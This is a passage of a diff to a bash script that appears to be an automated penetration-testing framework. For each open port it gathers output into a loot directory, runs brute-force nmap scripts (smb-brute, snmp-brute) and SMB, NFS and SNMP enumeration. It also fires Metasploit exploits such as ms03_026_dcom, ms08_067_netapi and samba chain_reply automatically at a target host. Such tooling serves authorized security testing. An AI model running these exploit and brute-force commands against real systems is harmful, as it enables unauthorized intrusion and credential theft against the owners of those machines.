+  cat $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null | egrep "\"" | cut -d\" -f2 | grep  \/ | sort -u 2> /dev/null | tee $LOOT_DIR/web/weblinks-http-$TARGET.txt 2> /dev/null
+  if [ $CUTYCAPT = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED SAVING SCREENSHOTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port80.jpg"
+    if [ ${DISTRO} == "blackarch"  ]; then
+      /bin/CutyCapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=5000 2> /dev/null
     else
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED RUNNING GOOGLE HACKING QUERIES $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      goohak $TARGET > /dev/null
+      cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=5000 2> /dev/null
     fi
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING INURLBR OSINT QUERIES $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    php $INURLBR --dork "site:$TARGET" -s inurlbr-$TARGET.txt | tee $LOOT_DIR/osint/inurlbr-$TARGET.txt
-    rm -Rf output/ cookie.txt exploits.conf
-    GHDB="1"
   fi
+  source $INSTALL_DIR/modes/normal_webporthttp.sh
+  source $INSTALL_DIR/modes/osint_stage_2.sh
 fi
 
 if [ -z "$port_110" ];
@@ -366,10 +422,12 @@ then
   echo -e "$OKRED + -- --=[Port 110 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 110 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV  -T5 --script=pop* -p 110 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV  -T5 --script=pop* -p 110 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port110.txt
+  fi
 fi
 
 if [ -z "$port_111" ];
@@ -377,16 +435,22 @@ then
   echo -e "$OKRED + -- --=[Port 111 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 111 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$TARGET\"; run; back;exit;"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING SHOW MOUNT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  showmount -a $TARGET
-  showmount -d $TARGET
-  showmount -e $TARGET
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/nfs/nfsmount; setg RHOSTS \"$TARGET\"; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw > $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port111-nfsmount.raw 2> /dev/null
+  fi
+  if [ "$SHOW_MOUNT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SHOW MOUNT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    showmount -a $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111a.txt
+    showmount -d $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111d.txt
+    showmount -e $TARGET | tee $LOOT_DIR/output/showmount-$TARGET-port111e.txt
+  fi
 fi
 
 if [ -z "$port_123" ];
@@ -394,10 +458,12 @@ then
   echo -e "$OKRED + -- --=[Port 123 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 123 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sU -sV -Pn -T5 --script=ntp-* -p 123 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sU -sV -Pn -T5 --script=ntp-* -p 123 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port123.txt
+  fi
 fi
 
 if [ -z "$port_135" ];
@@ -405,18 +471,26 @@ then
   echo -e "$OKRED + -- --=[Port 135 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 135 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING RPCINFO $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  rpcinfo -p $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -p 135 -T5 --script=rpc* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;"
+  if [ "$RPC_INFO" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING RPCINFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    rpcinfo -p $TARGET | tee $LOOT_DIR/output/rpcinfo-$TARGET-port135.txt
+  fi
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -p 135 -T5 --script=rpc* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port135.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use exploit/windows/dcerpc/ms03_026_dcom; setg RHOST \"$TARGET\"; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw > $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port135-ms03_026_dcom.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_137" ];
@@ -424,18 +498,26 @@ then
   echo -e "$OKRED + -- --=[Port 137 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 137 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING RPCINFO $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  rpcinfo -p $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -p 137 -T5 --script=broadcast-netbios-master-browser* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;"
+  if [ "$RPC_INFO" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING RPCINFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    rpcinfo -p $TARGET | tee $LOOT_DIR/output/rpcinfo-$TARGET-port137.txt
+  fi
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -p 137 -T5 --script=broadcast-netbios-master-browser* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port137.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/netbios/nbname; setg RHOSTS $TARGET; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-nbname.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-nbname.raw > $LOOT_DIR/output/msf-$TARGET-nbname.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-nbname.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_139" ];
@@ -444,20 +526,28 @@ then
 else
   echo -e "$OKORANGE + -- --=[Port 139 opened... running tests...$RESET"
   SMB="1"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING SMB ENUMERATION $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  enum4linux $TARGET
-  python $SAMRDUMP $TARGET
-  nbtscan $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV  -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;"
+  if [ "$SMB_ENUM" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SMB ENUMERATION $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    enum4linux $TARGET | tee $LOOT_DIR/output/enum4linux-$TARGET-port139.txt
+    python $SAMRDUMP $TARGET | tee $LOOT_DIR/output/samrdump-$TARGET-port139.txt
+    nbtscan $TARGET | tee $LOOT_DIR/output/nbtscan-$TARGET-port139.txt
+  fi
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV  -T5 -p139 --script=smb-server-stats --script=smb-ls --script=smb-enum-domains --script=smb-protocols --script=smb-psexec --script=smb-enum-groups --script=smb-enum-processes --script=smb-brute --script=smb-print-text --script=smb-security-mode --script=smb-os-discovery --script=smb-enum-sessions --script=smb-mbenum --script=smb-enum-users --script=smb-enum-shares --script=smb-system-info --script=smb-vuln-ms10-054 --script=smb-vuln-ms10-061 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port139.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/smb/pipe_auditor; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use auxiliary/scanner/smb/pipe_dcerpc_auditor; run; use auxiliary/scanner/smb/psexec_loggedin_users; run; use auxiliary/scanner/smb/smb2; run; use auxiliary/scanner/smb/smb_enum_gpp; run; use auxiliary/scanner/smb/smb_enumshares; run; use auxiliary/scanner/smb/smb_enumusers; run; use auxiliary/scanner/smb/smb_enumusers_domain; run; use auxiliary/scanner/smb/smb_login; run; use auxiliary/scanner/smb/smb_lookupsid; run; use auxiliary/scanner/smb/smb_uninit_cred; run; use auxiliary/scanner/smb/smb_version; run; use exploit/linux/samba/chain_reply; run; use windows/smb/ms08_067_netapi; run; use auxiliary/scanner/smb/smb_ms17_010; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port139.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port139.raw > $LOOT_DIR/output/msf-$TARGET-port139.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port139.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_161" ];
@@ -465,14 +555,20 @@ then
   echo -e "$OKRED + -- --=[Port 161 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 161 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 161 -sU -sT $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port161.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_162" ];
@@ -480,14 +576,20 @@ then
   echo -e "$OKRED + -- --=[Port 162 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 162 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap --script=/usr/share/nmap/scripts/snmp-brute.nse,/usr/share/nmap/scripts/snmp-hh3c-logins.nse,/usr/share/nmap/scripts/snmp-interfaces.nse,/usr/share/nmap/scripts/snmp-ios-config.nse,/usr/share/nmap/scripts/snmp-netstat.nse,/usr/share/nmap/scripts/snmp-processes.nse,/usr/share/nmap/scripts/snmp-sysdescr.nse,/usr/share/nmap/scripts/snmp-win32-services.nse,/usr/share/nmap/scripts/snmp-win32-shares.nse,/usr/share/nmap/scripts/snmp-win32-software.nse,/usr/share/nmap/scripts/snmp-win32-users.nse -sV -A -p 162 -sU -sT $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port162.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use scanner/snmp/snmp_enum; setg RHOSTS "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw > $LOOT_DIR/output/msf-$TARGET-snmp_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-snmp_enum.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_389" ];
@@ -495,10 +597,12 @@ then
   echo -e "$OKRED + -- --=[Port 389 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 389 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -p 389 -Pn -T5 --script=ldap* $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -p 389 -Pn -T5 --script=ldap* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port389.txt
+  fi
 fi
 
 if [ -z "$port_443" ];
@@ -506,89 +610,113 @@ then
   echo -e "$OKRED + -- --=[Port 443 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 443 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED CHECKING FOR WAF $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  wafw00f https://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-https 2> /dev/null
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-https > $LOOT_DIR/web/waf-$TARGET-https.txt 2> /dev/null
-  echo ""
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED GATHERING HTTP INFO $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  whatweb -a 3 https://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-https  2> /dev/null
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-https > $LOOT_DIR/web/whatweb-$TARGET-https.txt 2> /dev/null
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED GATHERING SERVER INFO $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  python3 $PLUGINS_DIR/wig/wig.py -d -q -t 50 https://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-https
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-https > $LOOT_DIR/web/wig-$TARGET-https.txt 2> /dev/null
+  if [ "$WAFWOOF" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR WAF $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    wafw00f https://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-https.raw 2> /dev/null
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-https.raw > $LOOT_DIR/web/waf-$TARGET-https.txt 2> /dev/null
+    rm -f $LOOT_DIR/web/waf-$TARGET-https.raw 2> /dev/null
+    echo ""
+  fi
+  if [ "$WHATWEB" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING HTTP INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    whatweb -a 3 https://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-https.raw  2> /dev/null
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-https.raw > $LOOT_DIR/web/whatweb-$TARGET-https.txt 2> /dev/null
+    rm -f $LOOT_DIR/web/whatweb-$TARGET-https.raw 2> /dev/null
+  fi
+  if [ "$WIG" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING SERVER INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    python3 $PLUGINS_DIR/wig/wig.py -d -q https://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-https
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-https > $LOOT_DIR/web/wig-$TARGET-https.txt 2> /dev/null
+  fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
-  wget -qO- -T 1 --connect-timeout=3 --read-timeout=3 --tries=1 https://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-https-$TARGET.txt 2> /dev/null
-  curl --connect-timeout 3 -I -s -R https://$TARGET | tee $LOOT_DIR/web/headers-https-$TARGET.txt 2> /dev/null
+  wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 https://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-https-$TARGET.txt 2> /dev/null
+  curl --connect-timeout 5 -I -s -R https://$TARGET | tee $LOOT_DIR/web/headers-https-$TARGET.txt 2> /dev/null
+  curl --connect-timeout 5 -I -s -R -L https://$TARGET | tee $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null
+  if [ "$WEBTECH" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    webtech -u https://$TARGET | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-https.txt
+  fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
+  echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
-  sslyze --resum --certinfo=basic --compression --reneg --sslv2 --sslv3 --hide_rejected_ciphers $TARGET | tee $LOOT_DIR/web/sslyze-$TARGET.txt 2> /dev/null
-  sslscan --no-failed $TARGET | tee $LOOT_DIR/web/sslscan-$TARGET.raw 2> /dev/null
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/sslscan-$TARGET.raw > $LOOT_DIR/web/sslscan-$TARGET.txt 2> /dev/null
-  echo ""
+  cat $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null | grep generator | cut -d\" -f4 2> /dev/null | tee $LOOT_DIR/web/webgenerator-https-$TARGET.txt 2> /dev/null
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED DISPLAYING COMMENTS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  cat $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null | grep "<\!\-\-" 2> /dev/null | tee $LOOT_DIR/web/webcomments-https-$TARGET.txt 2> /dev/null
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED DISPLAYING SITE LINKS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  cat $LOOT_DIR/web/websource-https-$TARGET.txt 2> /dev/null | egrep "\"" | cut -d\" -f2 | grep  \/ | sort -u 2> /dev/null | tee $LOOT_DIR/web/weblinks-https-$TARGET.txt 2> /dev/null
+  if [ "$SSL" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING SSL/TLS INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    sslscan --no-failed $TARGET | tee $LOOT_DIR/web/sslscan-$TARGET.raw 2> /dev/null
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/sslscan-$TARGET.raw > $LOOT_DIR/web/sslscan-$TARGET.txt 2> /dev/null
+    rm -f $LOOT_DIR/web/sslscan-$TARGET.raw 2> /dev/null
+    echo ""
+  fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED SAVING SCREENSHOTS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
   if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=1000 2> /dev/null
+    /bin/CutyCapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=5000 2> /dev/null
   else
-    cutycapt --url=https://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port443.jpg --insecure --max-wait=1000 2> /dev/null
